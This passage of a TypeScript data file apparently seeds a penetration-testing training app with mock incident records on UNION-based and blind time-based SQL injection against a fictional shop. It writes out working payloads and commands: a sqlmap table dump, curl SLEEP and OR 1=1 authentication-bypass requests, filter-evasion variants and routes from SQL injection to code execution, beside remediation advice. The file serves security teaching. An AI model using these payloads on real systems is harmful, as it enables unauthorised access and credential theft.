  <h2>admin</h2><p>$2b$12$kZ9...Q2eR</p>
</div>
... 4 rows

$ sqlmap -u 'https://shop.acme.com/products?id=1' --batch -D shop -T users --dump
Database: shop
Table: users
[4 entries]
+----+--------+-----------------------------+
| id | user   | pass                        |
+----+--------+-----------------------------+`,
    affected: [
      { kind: "Endpoint", name: "GET /products?id=", detail: "UNION-injectable, MySQL 5.7", action: "Convert to parameterised query; deny LIMIT/UNION via WAF.", severity: "critical" },
      { kind: "Database", name: "shop.users", detail: "4 rows dumped (admin hash)", action: "Force password reset for all admins; rotate session secrets.", severity: "critical" },
      { kind: "Account", name: "admin (hash $2b$12$...)", detail: "bcrypt — crackable if weak", action: "Run hashcat budget; force reset.", severity: "high" },
    ],
    cves: [{ id: "CWE-89", cvss: 9.8, title: "Improper neutralisation of SQL elements (SQL Injection)" }],
    aligned_tools: ["sqlmap", "curl", "burp", "hashcat", "report-template"],
    data_sources: ["app-logs", "sqlmap-output", "burp-history"],
    logs_sample: `[apache] 200 GET /products?id=1' ua='curl/8.4.0'
[mysql] error 1064: You have an error in your SQL syntax
[apache] 200 GET /products?id=-1 UNION SELECT 1,user,pass,4 FROM users-- -
[sqlmap] [INFO] the back-end DBMS is MySQL; injection point: GET id`,
    metrics_sample: `sqli_endpoints_tested                  18
sqli_endpoints_confirmed                3
tables_readable                       14
columns_readable                     147
bcrypt_hashes_dumped                   4`,
    response_actions: ["Capture sample row", "Notify client", "Convert to parameterised query", "Rotate admin creds"],
    next_steps: [
      { level: "L1", text: "Capture 1 row and the sqlmap fingerprint output. Do NOT dump the entire DB." },
      { level: "L2", text: "Notify client; recommend parameterised query and admin credential rotation." },
      { level: "L3", text: "Recommend ORM adoption + SAST rule banning raw string concatenation in DB calls." },
    ],
    lab_slug: "pen200-sqli-union",
    concept: concept({
      concept: "UNION-based SQL Injection",
      definition: "SQLi technique that appends a UNION SELECT to the original query to merge attacker-controlled columns into the legitimate result set.",
      why_it_exists: "Query is built via string concatenation, e.g. `\"SELECT * FROM products WHERE id=\" + req.query.id`. The id parameter is trusted.",
      blue_team_view: "WAF for UNION SELECT (signal); database query log review; SAST/DAST on every PR; mandatory ORM usage.",
      beginner: "Add a ' to the URL parameter. If the page errors out with SQL syntax, it's injectable. UNION SELECT lets you read other tables.",
      engineer: "Process: detect (' '), count cols (ORDER BY), find printable cols (UNION SELECT 1,2,3...), enumerate DB (information_schema), exfil (LIMIT pagination).",
      active_stage_id: "exploit",
      tool_keys: ["sqlmap", "curl", "burp"],
      learn_more: [
        { question: "Why use sqlmap when manual works?", answer: "Speed, WAF bypass tampers, DB-specific exploit chains (--os-shell, --reg-read), pagination handling." },
        { question: "What's the difference between UNION and stacked queries?", answer: "UNION appends rows to the same statement (read-only). Stacked queries (;) execute additional statements — only on some DBs (MSSQL, Postgres)." },
        { question: "How do you turn SQLi into RCE?", answer: "MySQL with FILE priv: INTO OUTFILE webshell. MSSQL: xp_cmdshell. Postgres: COPY FROM PROGRAM. Otherwise: stay in read mode and dump creds." },
      ],
    }),
  },

  {
    id: "PEN-INC-7002",
    title: "Blind time-based SQLi on login → admin auth bypass",
    severity: "critical", status: "open", owner: "web-pentester",
    engagement: "ACME-2026-Q2", target_scope: "shop.acme.com", target: "https://shop.acme.com/login",
    module: "PEN-M7", module_title: "M7 · SQL Injection",
    detected_at: iso(130), last_event_at: iso(18),
    kill_chain: "Recon → Exploit → Action", current_phase: "action",
    reached_phases: ["recon", "exploit", "action"],
    briefing: {
      who: "Web pentester investigating the login form (no obvious error-based SQLi).",
      what: "POST body with `username=admin' AND SLEEP(5)-- -` delays response by 5s — confirms blind SQLi; auth bypass with `' OR 1=1-- -` returns admin session.",
      where: "/login POST endpoint.",
      when: `${iso(130)} — blind detection 130m ago; admin login 18m ago.`,
      why: "Login query: SELECT * FROM users WHERE user='$user' AND pass='$pass'. Both fields concatenated.",
      how: "Detect via timing → SLEEP confirms → boolean payload bypasses auth → admin session cookie issued.",
      severity_rationale: "CRITICAL — complete authentication bypass; admin role granted to attacker.",
    },
    description: "Login endpoint is blind-time SQL injectable. A boolean-based payload bypasses authentication entirely and grants an admin session.",
    original_event: `# Baseline timing (4 attempts, all ~200ms)
$ time curl -s -o /dev/null -d "username=test&password=test" https://shop.acme.com/login
real    0m0.214s

# Blind time-based confirmation
$ time curl -s -o /dev/null --data-urlencode "username=admin' AND SLEEP(5)-- -" -d "password=x" https://shop.acme.com/login
real    0m5.218s    <-- 5s delay confirms SQLi

# Auth bypass
$ curl -i -d "username=admin' OR 1=1-- -&password=x" https://shop.acme.com/login | grep -i 'set-cookie\\|location'
HTTP/1.1 302 Found
Location: /admin/dashboard
Set-Cookie: session=A9B8C7D6...; HttpOnly`,
    affected: [
      { kind: "Endpoint", name: "POST /login", detail: "Blind time + boolean SQLi; concatenated query", action: "Parameterised query; constant-time response; rate-limit failed auth.", severity: "critical" },
      { kind: "Account", name: "admin (via SQLi bypass)", detail: "Session issued without password check", action: "Force reset; invalidate all admin sessions.", severity: "critical" },
    ],
    cves: [{ id: "CWE-89", cvss: 9.8, title: "Improper neutralisation of SQL elements (SQL Injection)" }],
    aligned_tools: ["sqlmap", "curl", "burp", "report-template"],
    data_sources: ["app-logs", "burp-history", "sqlmap-output"],
    logs_sample: `[apache] 302 POST /login user='admin' OR 1=1-- -' duration=215ms
[app] LOGIN_OK user=admin (matched by 'OR 1=1') ip=198.51.100.42
[sqlmap] [INFO] back-end DBMS is MySQL; time-based blind injection point: POST username`,
    metrics_sample: `login_endpoint_parameterised        NO
auth_bypass_payloads_blocked          0
admin_sessions_via_bypass             1
constant_time_login                  NO`,
    response_actions: ["Capture session cookie", "Notify client", "Rewrite login as parameterised", "Force admin password reset"],
    next_steps: [
      { level: "L1", text: "Capture cookie + 1 admin page load; do NOT make destructive changes." },
      { level: "L2", text: "Notify client; recommend immediate rewrite of login query and admin reset." },
      { level: "L3", text: "Add WAF for boolean SQLi patterns; SAST gate for raw query construction." },
    ],
    lab_slug: "pen200-sqli-blind",
    concept: concept({
      concept: "Blind / Time-based SQL Injection",
      definition: "SQLi where the application doesn't return errors or data, but the attacker infers results from response timing (SLEEP) or boolean differences (TRUE/FALSE pages).",
      why_it_exists: "Devs assume hiding error messages is sufficient defence. The underlying query is still concatenated.",
      blue_team_view: "Statement parameterisation enforced via SAST; WAF for SLEEP/BENCHMARK/WAITFOR; rate-limit per-IP login attempts.",
      beginner: "If a payload like `' AND SLEEP(5)-- -` makes the page take 5 extra seconds, the database executed your code — that's SQLi even without an error message.",
      engineer: "Detection: timing (SLEEP), boolean (1=1 vs 1=2 response diff), out-of-band (DNS via LOAD_FILE). Exploitation: bit-by-bit extraction with SUBSTRING + CASE.",
      active_stage_id: "exploit",
      tool_keys: ["sqlmap", "burp", "curl"],
      learn_more: [
        { question: "Why is blind SQLi slower to exploit?", answer: "Each character requires multiple requests (bit-by-bit or binary search) — sqlmap automates but throughput is request/sec-limited." },
        { question: "What payload bypasses 'AND 1=1' filters?", answer: "Variants: ') OR ('a'='a, /*!50000OR*/ 1=1, OR 1 LIKE 1, OR 0x1=0x1 — comment-encoded MySQL evasion." },
        { question: "How does authentication bypass with SQLi actually work?", answer: "Query becomes `... WHERE user='admin' OR 1=1-- -' AND pass='x'` — comment kills password check, OR 1=1 makes WHERE true; first row (often admin) is returned." },
      ],
    }),
  },

];

/* -------- Helpers -------- */
export function findPentestIncident(id: string): PentestIncident | undefined {
  return PEN_INCIDENTS.find((i) => i.id === id);
}
